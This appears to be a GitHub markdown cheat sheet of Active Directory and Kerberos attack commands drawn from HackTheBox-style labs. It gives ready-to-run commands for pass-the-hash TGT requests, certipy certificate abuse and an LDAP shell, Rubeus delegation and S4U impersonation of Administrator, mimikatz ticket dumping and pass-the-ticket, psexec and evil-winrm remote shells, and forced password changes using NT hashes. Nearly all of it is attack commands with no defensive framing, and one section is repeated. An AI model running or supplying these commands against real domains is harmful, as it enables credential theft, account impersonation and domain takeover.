<img width="1662" height="608" alt="image" src="https://github.com/user-attachments/assets/176f30d6-1f09-430f-8b1e-d38e2f0015b7" />

---

# With Password or Hash

## CCACHE
```powershell
python3 getTGT.py domain.local/Administrator -hashes :aad3b435b51404eeaad3b435b51404ee:NTHASH
python3 getTGT.py domain.local/user:Password123

export KRB5CCNAME=user.ccache
klist

nxc smb dc.rustykey.htb --use-kcache

nxc smb dc.rustykey.htb -k -M kerberoasting kerb_hashes
```

## PFX to CCACHE
```powershell
certipy req -u 'user@domen.local' -p 'password' -ca 'CA_NAME' -target 'CA-IP' -template 'Template_NAME' -dc-ip 'DC-IP'

certipy auth \
  -pfx user.pfx \
  -domain domain.local \
  -username user \
  -dc-ip 10.10.10.10

// LDAP Shell
certipy-ad auth \
  -pfx kerberos_user.pfx \
  -dc-ip 192.168.0.150 \
  -ldap-shell

$ whoami
$ change_password kerberos_user NewPassword123!
python3 getTGT.py domain.local/user:Password123
```

## PFX to PEM
```powershell
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem

evil-winrm \
  -i 10.10.10.10 \
  -S \
  -c cert.pem \
  -k key.pem
```
---

# Without Password

## TGT Delegation
```powershell
.\Rubeus.exe tgtdeleg /nowrap

nano svc_sql.kirbi.b64
cat svc_sql.kirbi.b64 | base64 -d > svc_sql.kirbi

impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
export KRB5CCNAME=svc_sql.ccache
```

## S4U2Self
```powershell
.\Rubeus.exe s4u \
  /user:svc_sql \
  /rc4:NTHASH \
  /impersonateuser:Administrator \
  /msdsspn:"cifs/dc.domain.local" \
  /nowrap



.\Rubeus.exe asktgt /user:svc_sql /rc4:NTHASH /nowrap

.\Rubeus.exe s4u \
  /ticket:BASE64_TGT \
  /impersonateuser:Administrator \
  /msdsspn:"cifs/dc.domain.local" \
  /nowrap
```

## S4U2Self in Linux
```powershell
impacket-getST \
  -spn "cifs/dc.domain.local" \
  -impersonate user \
  -hashes :NTHASH \
  domain.local/svc_sql

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/User@dc.domain.local
```

## AD CS Certification
```powershell
.\Certify.exe request /ca:domain.local\CA_NAME /template:User
```

## Ticket Dump
```powershell
.\Rubeus.exe triage
.\Rubeus.exe dump /nowrap

.\Rubeus.exe dump /service:SERVICE_NAME /nowrap

privilege::debug
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi

impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
klist
```

## KRB5.conf
```powershell
echo "10.129.232.130 dc.voleur.htb" >> /etc/hosts

// Get TGT
impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.129.232.130

// Export TGT Files
export KRB5CCNAME=svc_winrm.ccache

// Modify Realm
sudo tee /etc/krb5.conf > /dev/null <<EOF
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
EOF

// Connect with TGT
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB                                                                                                               
```

## TGT Delegation
```
.\Rubeus.exe tgtdeleg /nowrap

nano svc_sql.kirbi.b64
cat svc_sql.kirbi.b64 | base64 -d > svc_sql.kirbi

impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
export KRB5CCNAME=svc_sql.ccache

certipy-ad req -u svc_sql -k -no-pass -target DC02.darkzero.ext -ca 'darkzero-ext-DC02-CA' -template 'user'

certipy-ad auth -pfx svc_sql.pfx -domain darkzero.ext -dc-ip 172.16.20.2

python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","Password1!".encode("utf-16le")).digest()).decode())'
7facdc498ed1680c4fd1448319a8c04f

impacket-changepasswd -hashes :816ccb849956b531db139346751db65f -newhash :7facdc498ed1680c4fd1448319a8c04f 'darkzero.ext/svc_sql'@dc02.darkzero.ext
impacket-changepasswd -k -no-pass 'domain/user'@dc.domain.local

.\RunasCs.exe svc_sql Password1! "whoami /priv" --logon-type 5 --function 2 --bypass-uac
```
